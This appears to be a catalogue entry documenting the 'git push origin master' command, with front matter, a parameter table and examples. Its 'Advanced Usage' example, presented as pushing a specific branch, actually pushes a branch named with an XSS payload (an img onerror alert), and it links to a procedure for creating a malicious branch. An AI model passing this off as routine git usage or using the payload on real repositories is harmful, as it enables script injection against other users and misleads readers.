---
data: git push origin master
tags:
  - git
  - push
type: command
output: 'Push successful, updates remote'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:44.349Z'
id: d14a50cf-ea21-4f8e-8378-5259628799d1
verified: false
validated: true
submitted: true
---
# git-push-origin

## Command

```bash
git push origin master
```

## Description

Pushes local branch commits to the remote GitLab repository.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `master` | Branch to push | Yes |
| `origin` | Remote repository name | Yes |

## Examples

### Basic Usage

```bash
git push origin master
```

### Advanced Usage

Push specific branch:

```bash
git push origin "<img/src='x'/onerror=alert(document.domain)>"
```

## Expected Output

'To http://gitlab.example.com/project.git
 * [new branch]      master -> master'

## Related

- [[Related Procedure|procedures/Create-Malicious-Branch-with-XSS-Payload]]
